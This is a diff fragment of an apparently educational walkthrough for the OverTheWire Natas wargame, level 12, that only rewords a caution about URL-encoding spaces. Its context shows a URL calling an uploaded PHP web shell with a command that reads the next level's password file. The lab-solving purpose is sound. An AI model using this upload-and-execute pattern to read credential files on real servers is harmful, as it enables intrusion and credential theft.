@@ -78,7 +78,7 @@ If that works, you should see a list of files.
 http://natas12.natas.labs.overthewire.org/upload/r3bkauo8pd.php?e=cat%20/etc/natas_webpass/natas13
 ```
 > [!CAUTION]  
-> You **must** use `%20` (URL encoding for space) in the URL. Using a literal space will result in an error!
+> You **must** use `%20` (URL encoding for space) in the URL. Using a literal space or nothing will result in an error!
 
 If done correctly, you'll be shown the password for **natas13**. 
 
